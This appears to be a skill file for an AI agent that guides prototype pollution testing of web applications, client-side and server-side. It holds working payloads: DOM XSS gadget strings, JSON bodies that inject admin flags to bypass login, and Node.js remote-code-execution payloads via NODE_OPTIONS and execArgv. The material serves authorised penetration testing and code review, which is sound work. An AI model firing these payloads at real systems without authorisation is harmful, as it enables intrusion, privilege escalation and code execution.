---
name: vuln-prototype-pollution
description: "Prototype pollution testing skill. Tests client-side (DOM XSS gadgets) and server-side (Node.js RCE, auth bypass) via Object.prototype injection. Triggers: 'prototype pollution', 'proto pollution', '__proto__', 'constructor.prototype', 'object prototype injection', 'lodash merge', 'deep merge vulnerability'."
---

# Prototype Pollution Testing

JavaScript property lookup walks the prototype chain. Unsafe object merging injects properties into `Object.prototype`, affecting all runtime objects globally.

## Phase 1: Client-Side Detection

**URL parameter probes:**
```bash
# Query string
curl -s "https://<target>/?__proto__[testprop]=testval" | grep "testprop"
curl -s "https://<target>/?constructor[prototype][testprop]=testval"
curl -s "https://<target>/?__proto__.testprop=testval"

# Hash fragments (test in browser)
# https://<target>/#__proto__[testprop]=testval
```

**Browser console verification:**
```javascript
// Open browser console after visiting polluted URL
Object.prototype.testprop  // Should return undefined — if returns "testval" = vulnerable
```

**DOM Invader (Burp Suite):**
1. Enable DOM Invader in browser extension
2. Enable prototype pollution detection
3. Navigate the application — auto-detects pollution sources and gadgets

## Phase 2: Client-Side Exploitation (DOM XSS via Gadgets)

**jQuery sink:**
```javascript
// If jQuery html() is a gadget
// Payload: ?__proto__[html]=<img src onerror=alert(1)>
fetch("https://<target>/?__proto__[html]=<img src onerror=alert(1)>")
```

**AngularJS legacy gadget:**
```
?__proto__[ng-app]=
?__proto__[ng-click]=alert(1)
```

**General gadget hunting:**
```bash
# Known gadget list via ppmap
ppmap --url "https://<target>/" --gadgets

# Manual: look for jQuery.extend, _.merge, Object.assign usage
grep -r "\.extend\|deepMerge\|Object\.assign\|_.merge" js_files/
```

## Phase 3: Server-Side Detection (Node.js)

**Safe confirmation payload (JSON spaces injection):**
```bash
# If spaces increase = prototype polluted
curl -X POST "https://<target>/api/endpoint" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"json spaces":10}}'
# Then observe if JSON responses become indented

# Status pollution
curl -X POST "https://<target>/api/endpoint" \
  -d '{"__proto__":{"status":555}}'
# If any response returns HTTP 555 = polluted
```

**Query string parser (qs library):**
```bash
# qs parses nested objects differently
curl "https://<target>/api/search?__proto__[admin]=true"
curl "https://<target>/api/search?__proto__.admin=true"
```

**Automated server-side scan:**
```bash
# ppmap CLI
pip install ppmap
ppmap --url "https://<target>/" --server

# Nuclei
nuclei -t vulnerabilities/generic/prototype-pollution.yaml -u https://<target>
```

## Phase 4: Server-Side Exploitation

**Authentication bypass via property injection:**
```bash
curl -X POST "https://<target>/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrong","__proto__":{"admin":true}}'

curl -X POST "https://<target>/api/login" \
  -d '{"username":"admin","password":"wrong","__proto__":{"isAdmin":1}}'
```

**RCE via Node.js options injection:**
```bash
# Target: child_process spawn with polluted env
curl -X POST "https://<target>/api/process" \
  -d '{"__proto__":{"shell":"bash","NODE_OPTIONS":"--require /proc/self/fd/0"}}'

# Via execArgv
curl -X POST "https://<target>/api/task" \
  -d '{"__proto__":{"execArgv":["--eval","process.mainModule.require('"'"'child_process'"'"').execSync('"'"'id > /tmp/pwn'"'"')"]}}'
```

**Lodash merge (pre-4.17.11) exploitation:**
```bash
curl -X PATCH "https://<target>/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"polluted":true}}'
```

## Phase 5: Source Code Review

If source accessible:
```bash
# Find vulnerable merge patterns
grep -rn "Object\.assign\|\.merge\|deepMerge\|extend(" --include="*.js" src/
grep -rn "__proto__\|constructor\.prototype" --include="*.js" src/
grep -rn "qs.parse\|querystring.parse" --include="*.js" src/

# Check Lodash version
grep '"lodash"' package.json
# Versions < 4.17.11 have CVE-2019-10744

# Check for safe merge patterns (absence of prototype check)
grep -n "hasOwnProperty" src/utils/merge.js
```

## Validation (REQUIRED before reporting)

Confidence threshold ≥0.70 required. Three criteria:
1. **Causality**: specific `__proto__` payload → `Object.prototype.testprop` === injected value; OR observable behavior change (JSON indented, auth bypassed)
2. **Reproducibility**: consistent across fresh browser sessions / server restarts
3. **Impact**: DOM XSS execution demonstrated; OR auth bypass shown; OR command execution evidence

Use non-destructive payloads (json spaces, status code) for confirmation before attempting RCE chains. Document vulnerable merge function location when code access available.
